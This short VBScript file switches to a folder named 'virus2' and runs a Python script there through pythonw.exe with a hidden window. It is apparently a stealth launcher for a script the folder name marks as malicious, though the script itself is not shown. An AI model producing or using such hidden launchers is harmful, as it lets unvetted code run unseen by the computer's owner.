Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "virus2"
WshShell.Run "pythonw.exe script2.py", 0, False
Set WshShell = Nothing
